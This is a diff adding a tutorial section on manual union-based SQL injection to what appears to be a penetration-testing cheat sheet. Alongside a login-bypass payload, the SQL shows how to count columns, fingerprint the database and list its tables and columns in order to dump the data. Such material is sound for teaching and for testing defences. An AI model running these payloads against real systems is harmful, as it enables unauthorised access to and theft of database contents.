@@ -191,3 +191,69 @@ Login without password on a website that do password check in an injectable quer
 ' OR 1=1 -- -
 ```
 </div></div>
+
+<hr class="sr">
+
+## Manual Union-based SQLi
+
+<div class="row row-cols-md-2"><div>
+
+**Union-based SQLi** can only be achieved is the two queries have the same number of attributes in the SELECT, as per the property of the UNION clause. Hence, we first need to find how many parameters there are in the unknown request. There are 2 ways
+
+<details class="details-n">
+<summary><b>error-based</b> using <code>UNION SELECT</code></summary>
+
+```sql
+-- you don't known the query
+SELECT [...] UNION SELECT NULL -- fail
+SELECT [...] UNION SELECT NULL, NULL -- fail
+SELECT [...] UNION SELECT NULL, NULL, NULL -- fail
+SELECT [...] UNION SELECT NULL, NULL, NULL, NULL -- OK
+```
+
+As the 4 query is successful, we know that there are 4 parameters in the select. Note that NULL is the most used, but you may use any value such as `1`, `2`...
+</details>
+
+<details class="details-n">
+<summary><b>error-based</b> using <code>ORDER BY</code></summary>
+
+`ORDER BY` can take an index, which is a shortcut for the $nth$ argument in the select. If you use an invalid $n$, then the requests fails.
+
+```sql
+-- you don't known the query
+SELECT [...] ORDER BY 1 -- fail
+SELECT [...] ORDER BY 2 -- fail
+SELECT [...] ORDER BY 3 -- fail
+SELECT [...] ORDER BY 4 -- OK
+```
+</details>
+
+The second objective is to find the DBMS, and it's version, just to ensure that any following query is valid in the DBMS language.
+
+```sql
+SELECT [...] UNION SELECT @@version, NULL, NULL, NULL
+```
+
+> Note that there may be an error at this point if the server was expecting the first value of the select to be an "int" (for instance). Simply move the call of `@@version`, until it's successful.
+</div><div>
+
+The third objective is to find the database name.
+
+```sql
+SELECT [...] UNION SELECT database(), NULL, NULL, NULL
+```
+
+The fourth objective is to find the tables. Note that the following query will return one result, but if your attack channel allow you to display more than one, then you may remove the `group_concat`.
+
+```sql
+SELECT [...] UNION SELECT group_concat(table_name), NULL, NULL, NULL FROM information_schema.tables WHERE TABLE_SCHEMA='database_name'
+```
+
+Then, you may want to know a column names given a table
+
+```sql
+SELECT [...] UNION SELECT group_concat(column_name), NULL, NULL, NULL FROM information_schema.columns WHERE TABLE_NAME='table_name'
+```
+
+Now, you have everything you need to dump all results.
+</div></div>
